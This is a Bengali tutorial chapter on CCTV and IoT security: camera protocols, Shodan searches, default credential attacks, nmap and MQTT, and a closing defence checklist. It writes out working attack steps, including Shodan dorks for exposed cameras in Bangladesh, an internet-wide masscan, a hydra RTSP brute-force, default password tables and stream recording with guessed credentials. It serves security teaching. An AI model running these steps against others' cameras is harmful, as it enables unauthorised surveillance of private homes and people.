# অধ্যায় ৩২: CCTV ও IoT Security

## সহজ কথায়

IoT মানে হলো — তোমার ফ্রিজ, এসি, ফ্যান, বাতি, ক্যামেরা — সবই এখন ইন্টারনেটের সাথে সংযুক্ত। ভালো দিক হলো সবকিছু কন্ট্রোল করা যায় মোবাইল দিয়ে। খারাপ দিক হলো — **হ্যাকারও পারে**। এই চ্যাপ্টারে শিখবো কীভাবে CCTV ক্যামেরা ও IoT ডিভাইস হ্যাক হয়, আর কীভাবে বাঁচতে হয়।

> **মজার Analogy:** IoT ডিভাইসগুলো হলো খোলা জানালার মতো। তুমি জানালা খুলে দিলে যেমন কেউ ভেতরে আসতে পারে, IoT ডিভাইস ডিফল্ট পাসওয়ার্ডে রাখলেও তাই। **Shodan হলো সেই সার্চ ইঞ্জিন যে খোলা জানালাগুলো খুঁজে বের করে!**

---

## ১. CCTV Protocols — কীভাবে ক্যামেরা কথা বলে?

### RTSP (Real Time Streaming Protocol)

RTSP হলো CCTV ক্যামেরার ভাষা — এটা দিয়ে ভিডিও স্ট্রিম হয়।

```
# # RTSP URL প্যাটার্ন — বেশিরভাগ ক্যামেরার ডিফল্ট
rtsp://admin:admin@192.168.1.100:554/stream1
rtsp://admin:password@192.168.1.100:554/h264_stream
rtsp://root:root@192.168.1.100:554/live/main
```

```bash
# # RTSP স্ট্রিম অ্যাক্সেস করা (যদি পাসওয়ার্ড জানো)
ffplay rtsp://admin:password@192.168.1.100:554/stream1

# # VLC দিয়েও খোলা যায়:
# # Media → Open Network Stream → rtsp://admin:admin@192.168.1.100:554/stream1
```

### ONVIF (Open Network Video Interface Forum)

ONVIF হলো CCTV ক্যামেরার ইউনিভার্সাল স্ট্যান্ডার্ড — ব্র্যান্ড ভেদে সব ক্যামেরা ONVIF সাপোর্ট করে।

```bash
# # ONVIF Device Manager দিয়ে ক্যামেরা ডিটেক্ট
# # nmap দিয়ে ONVIF পোর্ট খোঁজা
nmap -p 80,554,8080,8899 192.168.1.0/24

# # ONVIF WS-Discovery — সব ক্যামেরা খুঁজে বের করবে
wsdscan 192.168.1.0/24
```

---

## ২. Camera Types & Vulnerabilities

### ক্যামেরার ধরণ ও তাদের দুর্বলতা

| ক্যামেরা টাইপ | দুর্বলতা | ঝুঁকি লেভেল |
|---------------|----------|-------------|
| **IP Camera (Hikvision, Dahua)** | Default password, RTSP unprotected | 🔴 খুব বেশি |
| **PTZ Camera** | Pan/Tilt/Zoom কন্ট্রোল হাইজ্যাক | 🟡 মাঝারি |
| **Baby Monitor** | Audio eavesdropping, 2-way audio abuse | 🔴 খুব বেশি |
| **Doorbell Camera** | Video feed intercept, physical tamper | 🟡 মাঝারি |
| **Webcam (ল্যাপটপের)** | RAT (Remote Access Trojan) দিয়ে অ্যাক্সেস | 🔴 খুব বেশি |

### সবচেয়ে কমন দুর্বলতা:

1. **Default Credentials:** admin:admin, admin:password, root:root, 666666:666666
2. **Firmware না আপডেট করা:** পুরনো ফার্মওয়্যারে জানা vulnerability আছে
3. **Telnet/SSH খোলা:** অনেকে ক্যামেরা সেটআপ করতে গিয়ে Telnet খোলা রেখে দেয়
4. **UPnP Enabled:** ক্যামেরা নিজেই রাউটারে পোর্ট ফরোয়ার্ড করে ফেলে
5. **Cloud Sync ছাড়া Local Storage:** SD কার্ডে ডাটা এনক্রিপ্টেড না থাকলে সরাসরি পড়া যায়

---

## ৩. Shodan দিয়ে Exposed CCTV খোঁজা

**Shodan** — ইন্টারনেটের সাথে সংযুক্ত সব ডিভাইসের সার্চ ইঞ্জিন। CCTV, রাউটার, প্রিন্টার, পাওয়ার প্ল্যান্ট — সবকিছু।

### Shodan Dorks (সার্চ কমান্ড)

```bash
# # সবচেয়ে বেশি এক্সপোজড CCTV খোঁজা
# # Shodan ওয়েবসাইটে নিচের কোয়েরিগুলো দাও:

# # 1. হিকভিশন ক্যামেরা
"Server: Hikvision-Webs"

# # 2. ডিফল্ট RTSP খোলা ক্যামেরা
"RTSP" port:554

# # 3. Dahua ক্যামেরা
"Dahua" "Camera"

# # 4. WebcamXP সফটওয়্যার
"webcamxp" "WebCamXP"

# # 5. ইন্ডাস্ট্রিয়াল ক্যামেরা
"ONVIF" "200 OK"

# # 6. বাংলাদেশের এক্সপোজড ক্যামেরা
country:"BD" "Server: Hikvision-Webs"

# # 7. নির্দিষ্ট সিটির ক্যামেরা
city:"Dhaka" "camera"

# # 8. Authentication ছাড়া ক্যামেরা
"200 OK" "Camera" "-authentication"
```

### Python দিয়ে Shodan API ব্যবহার

```python
# # Shodan API — প্রোগ্রামেটিক্যালি খোঁজা
import shodan  # pip install shodan

# # Shodan API কী (shodan.io-তে ফ্রি অ্যাকাউন্ট করে নাও)
API_KEY = "YOUR_SHODAN_API_KEY"
api = shodan.Shodan(API_KEY)

# # বাংলাদেশের এক্সপোজড ক্যামেরা খোঁজা
query = "Server: Hikvision-Webs country:BD"

try:
    results = api.search(query)
    print(f"পাওয়া গেছে: {results['total']} টি ক্যামেরা")

    for result in results['matches'][:5]:
        print(f"""
        IP: {result['ip_str']}
        পোর্ট: {result['port']}
        লোকেশন: {result.get('city', 'N/A')}, {result.get('country_name', 'N/A')}
        ISP: {result.get('isp', 'N/A')}
        """)

except shodan.APIError as e:
    print(f"Error: {e}")
```

### Shodan Command Line

```bash
# # Shodan CLI ইন্সটল
pip install shodan

# # API কী সেট
shodan init YOUR_API_KEY

# # সার্চ
shodan search "Server: Hikvision-Webs" --fields ip_str,port,org

# # নির্দিষ্ট IP-তে কী কী সার্ভিস আছে
shodan host 8.8.8.8

# # কাউন্ট জানতে
shodan count "RTSP port:554"
```

---

## ৪. Default Credential Attack

### ৪.১ হ্যাকাররা কীভাবে CCTV তে ঢোকে?

```bash
# # ধাপ ১: Shodan বা Masscan দিয়ে ক্যামেরা খোঁজা
masscan 0.0.0.0/0 -p554 --rate=100000 -oJ cameras.json

# # ধাপ ২: হাইড্রা দিয়ে ব্রুট-ফোর্স (ডিফল্ট পাসওয়ার্ড)
hydra -l admin -P passwords.txt rtsp://192.168.1.100

# # জনপ্রিয় CCTV পাসওয়ার্ড লিস্ট
# # এগুলোই ৮০% ক্যামেরায় কাজ করে
echo -e "admin\n12345\n123456\npassword\nadmin123\nroot\n666666\n888888\n111111" > cctv_passwords.txt

# # ধাপ ৩: RTSP স্ট্রিম অ্যাক্সেস
ffmpeg -i rtsp://admin:12345@192.168.1.100:554/stream1 -vcodec copy -acodec copy output.mp4
```

### ৪.২ Manufacturer Default Credentials

| ব্র্যান্ড | ইউজারনেম | পাসওয়ার্ড |
|-----------|-----------|------------|
| Hikvision | admin | 12345 |
| Dahua | admin | admin |
| TP-Link | admin | admin |
| D-Link | admin | (blank) |
| Cisco | root | cisco |
| Axis | root | pass |
| Sony | admin | admin |
| Samsung | admin | 4321 |

---

## ৫. IoT Device Security

### ৫.১ IoT ডিভাইসের সাধারণ সমস্যা

```python
# # IoT ডিভাইসে কি কি সমস্যা থাকে — একটা চেকলিস্ট

iot_vulnerabilities = {
    "Default Credentials": "/// ৮০% IoT ডিভাইস ডিফল্ট পাসওয়ার্ডেই চলে ///",
    "No Encryption": "/// HTTP ব্যবহার করে, HTTPS না — ডাটা plain text ///",
    "No Auto Update": "/// ফার্মওয়্যার আপডেট দেয় না — vulnerability থেকে যায় ///",
    "Hardcoded Backdoor": "/// ব্যাকডোর পাসওয়ার্ড থাকে ফার্মওয়্যারে ///",
    "Insecure Cloud": "/// AWS/Azure misconfiguration — ডাটা লিক ///",
    "UPnP Enabled": "/// নিজেই রাউটারে পোর্ট খুলে দেয় ///",
}

for vuln, desc in iot_vulnerabilities.items():
    print(f"[!] {vuln}: {desc}")
```

### ৫.২ IoT ডিভাইস স্ক্যান কমান্ড

```bash
# # লোকাল নেটওয়ার্কে IoT ডিভাইস খোঁজা
nmap -sn 192.168.1.0/24                    # লাইভ হোস্ট চেক
nmap -O 192.168.1.0/24                      # OS ডিটেক্ট
nmap -sV -p 80,443,8080,554,23 192.168.1.100  # সার্ভিস ভার্শন

# # IoT ডিভাইসের ওপেন পোর্ট চেক
nmap --script default,safe 192.168.1.100

# # RTSP service scan
nmap -sV --script rtsp-methods 192.168.1.0/24
```

### ৫.৩ MQTT — IoT-র সবচেয়ে জনপ্রিয় প্রোটোকল

MQTT হলো IoT ডিভাইসের মেসেজিং প্রোটোকল — লাইটওয়েট ও দ্রুত।

```bash
# # MQTT ব্রোকার খোঁজা (পাবলিক ব্রোকার)
# # HiveMQ পাবলিক ব্রোকার
mqtt://broker.hivemq.com:1883

# # MQTT সাবস্ক্রাইব করা (যদি এনক্রিপ্টেড না হয়)
mosquitto_sub -h broker.hivemq.com -p 1883 -t '#' -v

# # সব টপিক লিস্ট করা
mosquitto_sub -h test.mosquitto.org -t '#' -v

# # নির্দিষ্ট টপিক থেকে ডাটা পড়া (যেমন সেন্সর ডাটা)
mosquitto_sub -h 192.168.1.50 -t "home/temperature" -v
```

---

## ৬. কীভাবে বাঁচবে — IoT & CCTV Security Checklist

| ✅ করণীয় | ❌ বর্জনীয় |
|-----------|------------|
| ডিফল্ট পাসওয়ার্ড পরিবর্তন করো | ❌ admin:admin রেখো না |
| Firmware আপডেট রাখো | ❌ পুরনো firmware-এ vulnerability থেকে যায় |
| UPnP বন্ধ করো রাউটারে | ❌ ক্যামেরাকে নিজে পোর্ট খুলতে দিয়ো না |
| VLAN/Segregated Network ব্যবহার করো | ❌ IoT আর ল্যাপটপ/ফোন একই নেটওয়ার্কে রেখো না |
| RTSP এনক্রিপ্ট করো (SRTP বা VPN) | ❌ অননুমোদিত RTSP অ্যাক্সেস খোলা রাখো না |
| ক্যামেরা FW port forward বন্ধ রাখো | ❌ ইন্টারনেট থেকে সরাসরি ক্যামেরা অ্যাক্সেস দিয়ো না |
| 2FA চালু করো ক্যামেরা অ্যাপে | ❌ অ্যাকাউন্টে দুর্বল পাসওয়ার্ড ব্যবহার করো না |
| Shodan-এ নিজের আইপি চেক করো | ❌ কী কী exposed আছে না দেখে থাকো না |

### Shodan-এ নিজেকে চেক করার কমান্ড:

```bash
# # নিজের পাবলিক আইপি বের করা
curl ifconfig.me

# # Shodan-এ নিজের আইপি চেক করা
shodan host YOUR_PUBLIC_IP

# # Shodan Monitor — যেকোনো পরিবর্তন হলে ইমেইল আসবে
# # shodan.io/monitor — ফ্রি একাউন্টে ১৬ আইপি মনিটর করা যায়
```

---

## ল্যাব এক্সারসাইজ

> **ল্যাব ১:** Shodan.io-তে গিয়ে `"Server: Hikvision-Webs"` সার্চ দাও — কতগুলো বাংলাদেশি ক্যামেরা পাচ্ছো দেখো।

> **ল্যাব ২:** Masscan দিয়ে লোকাল নেটওয়ার্কের পোর্ট ৫৫৪ স্ক্যান করো — কতগুলো RTSP সার্ভার আছে দেখো।

> **ল্যাব ৩:** একটি IoT সিমুলেটর (Cisco Packet Tracer IoT) দিয়ে স্মার্ট হোম বানিয়ে MQTT প্রোটোকল অ্যানালাইসিস করো।

> **ল্যাব ৪:** nmap `--script rtsp-methods` দিয়ে একটি RTSP ক্যামেরার মেথড ডিটেক্ট করো (DESCRIBE, SETUP, PLAY, TEARDOWN)।

> **ল্যাব ৫:** নিজের রাউটার চেক করো — UPnP চালু আছে কিনা দেখো। থাকলে বন্ধ করো। তারপর Shodan Monitor-এ নিজের পাবলিক আইপি যোগ করো।

---

## মনে রাখো

| টপিক | মূল পয়েন্ট |
|-------|------------|
| RTSP Protocol | রিয়েল-টাইম ভিডিও স্ট্রিম — পোর্ট ৫৫৪ |
| ONVIF Standard | সব ক্যামেরার ইউনিভার্সাল স্ট্যান্ডার্ড — পোর্ট ৮০/৮৮৯৯ |
| Shodan | IoT-র Google — সার্চ ইঞ্জিন সব কানেক্টেড ডিভাইস খুঁজে বের করে |
| Default Credentials | ৮০% ক্যামেরায় admin:admin বা admin:12345 কাজ করে |
| MQTT | IoT মেসেজিং প্রোটোকল — এনক্রিপ্ট না করলে সব ডাটা পড়া যায় |
| CCTV Hacking | RTSP ব্রুট-ফোর্স → Shodan scanning → Firmware exploit |
| Security | VLAN, VPN, Firmware Update, 2FA — এই ৪টা করলেই ৯০% নিরাপদ |

> **শেষ কথা:** ভাই, মনে রেখো — তোমার ক্যামেরা যদি ইন্টারনেটে থাকে, তাহলে সেটা শুধু তুমি না, **পুরো দুনিয়াও দেখতে পারে**। ডিফল্ট পাসওয়ার্ড চেঞ্জ করো। UPnP বন্ধ করো। আর নিজেকে Shodan-এ সার্চ দিয়ে দেখো — "কী কী আছে আমার!"
